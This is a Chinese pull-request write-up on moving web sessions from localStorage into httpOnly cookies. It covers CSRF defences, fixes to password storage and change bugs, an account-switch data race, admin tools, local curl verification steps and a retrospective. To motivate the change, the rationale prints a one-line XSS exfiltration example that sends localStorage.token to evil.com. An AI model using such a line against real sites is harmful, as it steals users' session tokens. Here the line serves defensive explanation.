# PR-002 会话搬进 httpOnly Cookie

- **分支**：`feat/session-cookie`
- **合并提交**：`fb5f573`
- **影响面**：认证传输、前端存储、CSRF、多用户切换、部署
- **风险等级**：中（登录链路重写，但保留了 Bearer 兼容）

---

## 为什么

PR-001 解决了「谁能进来」，但凭证还放在 `localStorage` 里。

这个位置的问题不是「可能被偷」，是**偷走之后服务端完全无感**：
localStorage 里任何东西，页面上的 JS 都能读。站点一旦有 XSS
（第三方组件、Markdown 渲染、富文本粘贴都可能引入），
一行 `fetch('https://evil.com?t=' + localStorage.token)` 就把会话带走了，
而且那个令牌是完全合法的，服务端没有任何理由拒绝它。

换成 `HttpOnly` Cookie 后，`document.cookie` 读不到，JS 拿不到令牌。
XSS 的收益从「接管账号」降到「在当前页面里做点事」。

顺带在这轮修了两个更丢人的问题（见下）。

---

## 改了什么

**认证传输**（`app/auth.py`、`app/routers/auth.py`）

- 登录/注册：`Set-Cookie: p2m_session=...; HttpOnly; SameSite=lax; Max-Age=12h`
- `extract_token`：Cookie 优先于 `Authorization`，Bearer 保留给脚本/CLI
- 新增 `/api/auth/logout`；改密码时清 Cookie（否则旧 Cookie 会一直 401）
- `COOKIE_SECURE` 配置项：HTTPS 必须 true，本地 http 必须 false（互斥）

**CSRF**（`app/core/csrf.py` 新增）

Cookie 认证的对价。三道防线缺一不可：

1. `SameSite=Lax` —— 跨站写请求默认不带 Cookie
2. `CSRFGuardMiddleware` —— 带会话 Cookie 的写请求，Origin/Referer 必须同源
3. 统一 JSON 请求体 —— HTML 表单发不出 `application/json`，跨站 JSON 会触发预检

**修掉两个会被面试官直接扣分的问题**

| 问题 | 原实现 | 修复 |
|---|---|---|
| 登录页「记住密码」 | 明文密码写进 `localStorage` | 只记用户名，密码交给浏览器凭据管理器 |
| 设置页「修改密码」 | 只改了浏览器 IndexedDB 的哈希，后端不知道 | 改走 `/api/auth/change-password`，成功即失效所有会话 |

第二个尤其危险：用户会以为改了密码，**下次还能用旧密码登录**，而且界面提示「密码已修改」。

**切换账号的写入竞态**（`src/lib/idbStorage.ts`、`src/stores/authStore.ts`）

写盘有 3 秒 debounce。A 改完数据、3 秒内切到 B，定时器触发时用的是 B 的会话 ——
**A 的笔记会写进 B 的账户**。

三处一起修：

- `flushAllPending()` 改为可 await，登出时**先落盘再清会话**（顺序反了数据就丢）
- IndexedDB 的 key 加 `u{id}:` 前缀
- 登录/登出**整页重载**

**用户管理**（`app/routers/admin.py` + `UserManagementSection.tsx`）

建号 / 改角色 / 停用 / 重置密码 / 删除。三条防呆由后端强制：
不能动自己、始终保留至少一个启用的管理员、停用即踢下线（`token_version + 1`）。

**上线能力**

- `docker-compose.https.yml` + `Caddyfile`：自动证书
- `scripts/backup.sh` / `restore.sh`
- `scripts/preflight.sh`：16 项自检

---

## 怎么验证

```bash
# Cookie 属性
curl -si -X POST http://localhost/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"xxx","password":"xxx"}' | grep -i set-cookie
# 期望：HttpOnly; Max-Age=43200; Path=/; SameSite=lax

# 仅靠 Cookie 能访问，无凭证 401，Bearer 仍可用
curl -s -o /dev/null -w "%{http_code}\n" -b cj.txt http://localhost/api/learning/profile

# CSRF：恶意 Origin 被拦，同源放行
curl -s -o /dev/null -w "%{http_code}\n" -b cj.txt -X POST \
  http://localhost/api/learning/goals -H "Content-Type: application/json" \
  -H "Origin: http://evil.example.com" -d '{"title":"x","weekly_hours":5}'
# 期望 403 csrf_rejected

# 浏览器端（Playwright 脚本 scripts/e2e-auth-check.cjs）
# PASS  document.cookie 读不到会话
# PASS  登录后整页重载仍保持登录态
```

---

## 风险与回滚

**风险 1**：升级瞬间，浏览器里旧的 `localStorage` 令牌被 `markSession` 清掉，
所有已登录用户需要重新登录一次。这是一次性代价，无法避免（换了传输方式）。

**风险 2**：`COOKIE_SECURE=true` 配在 http 环境下，浏览器不保存 Cookie，
表现为「登录成功但立刻被踢回登录页」。`preflight.sh` 会提前检查这个组合。

**回滚**：`git revert fb5f573`。Cookie 会变成无人使用，Bearer 路径仍在，前端回退到 localStorage 也能工作。

---

## 复盘

### 1. 认证方式的代价必须成对考虑

把令牌从 localStorage 搬到 Cookie，看起来是纯收益 ——
但**浏览器会自动带 Cookie**，这正好是 CSRF 成立的条件。

所以「上 Cookie」和「上 CSRF」是**同一个决定**，不是两件事。
只做前一半，等于把一个洞换成另一个洞。

这个思维模型可以推广：**任何「让凭证自动生效」的机制，都要同时问「谁能触发它」。**

### 2. 「假的成功」比报错难查一百倍

改密码那个 bug，界面提示「密码已修改」，`setPwMsg('密码已修改')` 写在成功分支里。
它不报错、不抛异常、UI 反馈完整 —— 唯一的破绽是**下次登录还能用旧密码**，
而这时候用户已经相信改成功了。

这类代码的特征是：**只验证了自己这一侧，没有验证结果落到哪。**
`upsertUser(currentUser, newHash)` 确实成功了，改的只是 IndexedDB，不是数据库。

防线很简单：**写完之后，从另一条路径读一次。**
改完密码就用新密码登录一次；写完之后就刷新页面看一眼。
30 秒的成本，能挡住一整类问题。

### 3. 整页重载是「笨但不会漏」的方案

切账号要清 9 个 store 的内存状态。理想做法是逐个写 reset 逻辑 ——
但只要漏一个，就是数据串号，而且**不会报错**。

`window.location.reload()` 看起来很土，但它把「清理状态」变成了「重新初始化」，
不存在漏的可能。**在正确性和优雅之间，这种场景应该选正确性。**

### 4. 自检脚本抓到了自己写的 bug

`preflight.sh` 跑第一遍就报：`JWT_SECRET 仍是示例值`。

PR-001 加了鉴权、加了限流、加了角色 —— 但**密钥没换**。
等于门装了锁，钥匙还挂在门把手上，任何人都能伪造管理员令牌。

这件事的教训不是「要记得换密钥」，是：
**安全检查要能跑，不能只存在于清单里。**
清单会忘，脚本每次都会跑。
